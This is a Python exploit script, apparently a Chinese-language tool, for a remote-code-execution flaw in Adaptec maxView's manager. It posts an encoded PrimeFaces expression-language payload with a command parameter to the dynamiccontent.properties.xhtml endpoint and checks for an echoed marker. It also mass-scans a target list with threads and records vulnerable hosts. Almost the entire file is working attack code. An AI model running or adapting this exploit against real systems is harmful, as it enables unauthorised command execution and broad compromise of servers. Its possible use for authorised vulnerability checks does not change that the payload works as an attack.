import argparse
import requests
import concurrent.futures
import sys

def poc(url):
    headers = {
        'User-Agent': 'User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = """pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd=echo xhs"""

    vulnurl = url + "/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml"
    try:
        # 发送 POST 请求
        r = requests.post(vulnurl, headers=headers, data=data, verify=False, timeout=5)
        if r.status_code == 200 and 'xhs' in r.text:
            print('\033[1;31m' + '[+] 成功 ' + vulnurl + '\033[0m')
            with open('results.txt', 'a') as f:
                f.write(vulnurl + '\n')
        else:
            print('[-] Failed')
    except requests.exceptions.ConnectionError as e:
        print(f"连接失败:{e}")
# 批量
def pl(filename):
    with open(filename, 'r',encoding='utf-8') as f:
        urls = [line.strip() for line in f.readlines()]
    return urls

def help():
    helpinfo = """
███    ███  █████  ██   ██ ██    ██ ██ ███████ ██     ██    ██████   ██████ ███████ 
████  ████ ██   ██  ██ ██  ██    ██ ██ ██      ██     ██    ██   ██ ██      ██      
██ ████ ██ ███████   ███   ██    ██ ██ █████   ██  █  ██    ██████  ██      █████   
██  ██  ██ ██   ██  ██ ██   ██  ██  ██ ██      ██ ███ ██    ██   ██ ██      ██      
██      ██ ██   ██ ██   ██   ████   ██ ███████  ███ ███  ██ ██   ██  ██████ ███████ 
"""
    print(helpinfo)
    print("maxView.RCE".center(82, '*'))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -f --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")

def main():
    parser = argparse.ArgumentParser(description='maxView.RCE漏洞单批检测脚本@xhs')
    parser.add_argument('-u','--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f','--file', type=str, help='批量检测文本')
    parser.add_argument('-t','--thread',type=int, help='线程，默认为5')
    args = parser.parse_args()
    thread = 5
    if args.thread:
        thread = args.thread
    if args.url:
        poc(args.url)
    elif args.file:
        urls = pl(args.file)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            executor.map(poc, urls)
    else:
        help()
if __name__ == '__main__':
    main()